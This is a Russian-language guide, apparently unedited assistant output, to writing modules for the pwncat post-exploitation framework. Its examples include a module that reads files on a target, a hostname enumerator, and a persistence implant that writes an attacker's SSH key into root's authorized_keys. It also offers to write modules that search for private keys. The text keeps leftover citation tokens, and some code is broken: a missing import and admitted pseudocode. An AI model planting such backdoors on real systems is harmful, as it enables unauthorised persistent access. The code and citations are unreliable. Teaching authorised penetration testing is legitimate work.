# Гайд: как писать модули для pwncat (markdown)

Этот документ — пошаговый, практический гайд по созданию модулей для pwncat (pwncat-vl / pwncat-cs). В нём объясняются архитектурные особенности, API, лучшие практики и примеры простых модулей для разных сценариев (базовый модуль, перечисление, имплант).

> Источники: внутренняя документация модулей pwncat (BaseModule, EnumerateModule, ImplantModule) и примеры из репозитория. Смотрите раздел «Ссылки» внизу для деталей.

---

## Содержание

1. Введение и общая архитектура
2. Где размещать модули (структура каталогов)
3. Основные классы и интерфейсы

   * `BaseModule`
   * `EnumerateModule`
   * `ImplantModule`
   * `Argument`, `Status`, `Result`
4. Жизненный цикл модуля и поведение `run`
5. Аргументы модуля и проверка типов
6. Взаимодействие с сессией (`session`) — полезные методы
7. Регистрация фактов / выдача результатов
8. Практические примеры модулей

   * A. Простой вывод (Hello) — синхронный модуль
   * B. Модуль чтения файла — использует `session.platform.Path`
   * C. Enumerate module — собирает `HostnameData` факт
   * D. Implant example — простая установка SSH public key (демонстрация install())
9. Тестирование и отладка модулей
10. Рекомендации по безопасности и этикету
11. Ссылки и полезные места в кодовой базе

---

## 1) Введение и общая архитектура

Модули в pwncat — это расширяемая система для автоматизации действий на целевой машине (перечисление, привилегии, установка имплантов и др.). Основная точка входа — класс `Module` (или `Module` наследуемый от `BaseModule`), в котором реализуется `run()` или, для специальных типов модулей, `enumerate()` / `install()`.

Документация API подробно описывает поведение `BaseModule`, аргументов, результатов и ожиданий по использованию `yield Status(...)` для отчёта прогресса и `return` или `yield` для окончательных результатов. fileciteturn1file13

## 2) Где размещать модули (структура каталогов)

По умолчанию pwncat загружает модули из пакета `pwncat.modules` (папка `pwncat/modules/`). Вы можете положить свои модули в подпапки (например, `linux/`, `windows/`, `implant/`, `enumerate/`) — загрузчик автоматически найдёт классы, наследующие `BaseModule`. Также есть команда `load`/`Manager.load_modules()` для динамической загрузки модулей из внешних путей. fileciteturn1file13

## 3) Основные классы и интерфейсы

### `BaseModule`

Ключевые моменты:

* Любой модуль должен наследовать `pwncat.modules.BaseModule`.

* Поля класса:

  * `ARGUMENTS`: словарь аргументов (имя → `Argument`), описывает типы и help.
  * `PLATFORM`: список поддерживаемых платформ (или `None` для всех).
  * `ALLOW_KWARGS`: если `True` — модуль принимает произвольные ключевые аргументы.
  * `COLLAPSE_RESULT`: если истина и модуль возвращает единственный результат — он будет упрощён до скаляра. fileciteturn1file13

* `run(session: pwncat.manager.Session, progress: Optional[bool] = None, **kwargs)` — основной метод. Все аргументы из `ARGUMENTS` будут переданы как именованные аргументы; типы уже проверены декоратором. Если возникают ошибки — бросайте `ModuleError`/`ModuleFailed` (фреймворк аккуратно их обработает). fileciteturn1file8

### `EnumerateModule` (перечисления)

* Подкласс `EnumerateModule` используется для модулей, которые создают и сохраняют факты (instances of `pwncat.db.Fact`) в базу данных.
* Обязательные атрибуты:

  * `PROVIDES`: список типов фактов (строк) которые модуль генерирует.
  * `SCOPE` и `Schedule` — управляют частотой выполнения и сферой действия данных (HOST/SESSION/NONE, ONCE/PER_USER/ALWAYS).
* Требуется реализовать `enumerate(self, session)` генератор, который `yield`-ит `Fact`-объекты и `Status`-сообщения. Не переопределяйте `run` (фреймворк делает это за вас). fileciteturn1file11

### `ImplantModule` (импланты / persistence)

* Служит для реализации имплантов (постоянных механизмов доступа / локальной эскалации), и определяет `install()` вместо `run()`.
* `install()` — генератор, который yield'ит `Status` и возвращает объект `Implant` (подкласс `pwncat.facts.implant.Implant`) при успешной установке. Фреймворк затем сохранит этот имплант в базе. fileciteturn1file12

### `Argument`, `Status`, `Result`

* `Argument(type, default=NoValue, help='')` — определение аргумента модуля. Если значение `default` равно `NoValue`, аргумент обязателен. fileciteturn1file13
* `Status` — строковый объект, используемый для обновления прогресса: `yield Status("Doing step 1")`.
* Результаты модулей должны быть объектами, реализующими интерфейс `Result` (`title(session)`, `description(session)` и т.д.) — класс `pwncat.db.Fact` уже реализует `Result`. fileciteturn1file12

## 4) Жизненный цикл модуля и `run`

1. Менеджер вызывает модуль через `session.run(module_name, **kwargs)`.
2. Декоратор `pwncat.modules.run_decorator` проверяет типы аргументов и создаёт прогресс-инструменты. fileciteturn1file13
3. В `run()` вы можете `yield Status(...)` несколько раз для прогресса.
4. Возвращайте результаты через `yield some_result` (массив результатов) или `return single_result`.
5. Если произошла ошибка — бросайте `ModuleFailed`/`ModuleError` — фреймворк перехватит и аккуратно покажет ошибку пользователю. fileciteturn1file8

## 5) Аргументы модуля и проверка типов

* Аргументы определяются как `ARGUMENTS = { 'name': Argument(int, default=NoValue, help='...') }`.
* Поддерживаемые типы включают: `str` (по умолчанию), `int`, `Bool`, `List(type)` и т.д. Есть специальный `Bool` конвертер, который понимает `1/0/true/false`. fileciteturn1file8
* Если `ALLOW_KWARGS=True`, несуществующие аргументы не вызовут ошибку; в противном случае фреймворк бросит `InvalidArgument`. fileciteturn1file13

## 6) Взаимодействие с сессией (`session`)

Полезные методы `session`:

* `session.run(module_name, **kwargs)` — запустить вложенный модуль.
* `session.platform.Path(path)` — объект pathlib-like для чтения/записи файлов на цели (удобно для переносимости между Linux/Windows). fileciteturn1file16
* `session.register_fact(fact, scope=Scope.HOST, commit=False)` — зарегистрировать факт вручную.
* `session.log(...)` и `session.print(...)` — вывод в лог, безопасный относительно прогресс-индикаторов.
* `session.current_user()` — получить объект `User` текущего пользователя. fileciteturn1file16

## 7) Регистрация фактов и результаты

* Для перечислений возвращайте объекты-наследники `pwncat.db.Fact` — они будут сохранены и отображены корректно (рекомендуется реализовать `title()` и `description()`). fileciteturn1file12
* Для одноразовых результатов можно возвращать простые строки или объекты `Result`.

## 8) Практические примеры модулей

> Все примеры — Python3. Положите файлы в `pwncat/modules/<категория>/my_module.py` и перезапустите pwncat или используйте `load`.

### A) Hello — самый простой модуль

```python
# pwncat/modules/misc/hello.py
from pwncat.modules import BaseModule, Argument, Status

class Module(BaseModule):
    """Простой тестовый модуль: печатает приветствие"""

    ARGUMENTS = {
        'name': Argument(str, default='world', help='имя для приветствия')
    }

    def run(self, session, name: str):
        yield Status(f"Готовимся поприветствовать {name}...")
        session.log(f"Hello module running for {name}")
        # Можно вернуть строку — framework покажет её
        return f"Hello, {name}!"
```

Запуск: `run misc.hello name=rain` или `run misc.hello`.

### B) File reader — читаем удалённый файл (платформо-независимо)

```python
# pwncat/modules/misc/read_file.py
from pwncat.modules import BaseModule, Argument, Status

class Module(BaseModule):
    """Read remote file using platform.Path abstraction"""

    ARGUMENTS = {
        'path': Argument(str, help='путь к файлу на цели')
    }

    def run(self, session, path: str):
        yield Status(f"Opening {path} on target")
        remote_path = session.platform.Path(path)
        try:
            content = remote_path.read_text()
        except Exception as e:
            raise Exception(f"Failed to read {path}: {e}")
        yield Status("Read complete")
        # Возвращаем результат как строку — он будет выведен в UI
        return {'path': path, 'size': len(content), 'content_preview': content[:1024]}
```

Запуск: `run misc.read_file path=/etc/hostname`.

### C) Enumerate example — простая коллекция hostname (факт)

```python
# pwncat/modules/enumerate/hostname.py
from pwncat.modules.enumerate import EnumerateModule, Scope
from pwncat.db import Fact
from pwncat.modules import Status

class HostnameFact(Fact):
    def __init__(self, source, hostname):
        super().__init__(types=["hostname"], source=source)
        self.hostname = hostname

    def title(self, session):
        return f"Hostname: {self.hostname}"

class Module(EnumerateModule):
    """Enumerate hostname of target"""
    PROVIDES = ["hostname"]
    SCOPE = Scope.HOST

    def enumerate(self, session):
        yield Status("Getting hostname")
        try:
            # Используем платформенный Path или просто команду
            hostname = session.platform.run('hostname') if hasattr(session.platform, 'run') else session.run('misc.read_file', path='/etc/hostname')
            # Преобразуйте результат, если нужно; здесь — псевдокод
            hostname = str(hostname).strip()
        except Exception:
            # Попробуем безопасный fallback: чтение /etc/hostname
            try:
                hostname = session.platform.Path('/etc/hostname').read_text().strip()
            except Exception:
                hostname = 'unknown'
        yield HostnameFact(self.__class__.__name__, hostname)
```

Примечание: в реальном коде используйте корректные `session.platform` методы; пример демонстрирует идею. Сохранённые факты будут видны в базе. fileciteturn1file11

### D) Implant example — добавить SSH public key (демонстрация `install()`)

```python
# pwncat/modules/linux/implant/add_ssh_key.py
from pwncat.modules.implant import ImplantModule
from pwncat.facts.implant import Implant
from pwncat.modules import Status

class SimpleKeyImplant(Implant):
    def __init__(self, source, path, uid):
        super().__init__(source=source, types=['implant.ssh_key'], uid=uid)
        self.path = path

    def title(self, session):
        return f"SSH key implant at {self.path} (uid={self.uid})"

    def remove(self, session):
        # Удаление (пример)
        try:
            session.platform.Path(self.path).unlink()
        except Exception:
            pass

class Module(ImplantModule):
    ARGUMENTS = {
        'pubkey': Argument(str, help='SSH public key content to install'),
        'user': Argument(str, default='root', help='user to install key for')
    }

    def install(self, session, pubkey: str, user: str):
        yield Status(f"Installing SSH key for {user}")
        home = f"/home/{user}" if user != 'root' else '/root'
        auth_path = f"{home}/.ssh/authorized_keys"
        # Create .ssh dir and append key
        try:
            session.platform.Path(f"{home}/.ssh").mkdir(parents=True, exist_ok=True)
            with session.platform.Path(auth_path).open('a') as fh:
                fh.write(pubkey.strip() + '\n')
        except Exception as e:
            raise Exception(f"Failed to install key: {e}")
        yield Status("Key written")
        # Вернуть Implant объект
        return SimpleKeyImplant(self.__class__.__name__, auth_path, uid=0)
```

Сделайте `run linux.implant.add_ssh_key pubkey="ssh-rsa AAA..." user=root`.

## 9) Тестирование и отладка

* Логи: используйте `session.log()` для вывода отладочной информации без поломки прогресс-бара.
* Unit-тесты: pwncat содержит набор тестов; следуйте `CONTRIBUTING.md` по запуску тестов при помощи `pytest`/docker. fileciteturn0file4
* Отдельная проверка: загрузите модуль через `load` и выполните в интерактивной сессии `run module_name`.

## 10) Рекомендации по безопасности и этикету

* Никогда не запускайте модули, которые могут повредить системы, против систем без разрешения.
* Тщательно тестируйте в изолированных средах (контейнерах/VM).
* Отслеживайте и регистрируйте все изменения, используйте `pwncat.facts.tamper` если вы делаете изменения которые нужно вернуть. fileciteturn1file17

## 11) Ссылки и полезные места в кодовой базе

* Основная документация по модулям: `pwncat/modules` и `pwncat.modules` API. fileciteturn1file13
* EnumerateModule reference: `pwncat.modules.enumerate`. fileciteturn1file11
* Implant modules: `pwncat.modules.implant` (пример и контракт install/Implant). fileciteturn1file12
* Session/Platform API: `pwncat.manager.Session` и `session.platform` методы. fileciteturn1file16

---

*Готово.*

Если хотите, могу:

* добавить ещё 2–3 реальных модуля, адаптированных под ваши задачи (например: сбора crontab, поиска приватных ключей, автоматического запуска linpeas),
* помочь с unit-тестами для предложенных модулей,
* или подготовить PR-ready версию файлов для вставки в `pwncat/modules/`.

---

*Конец документа.*
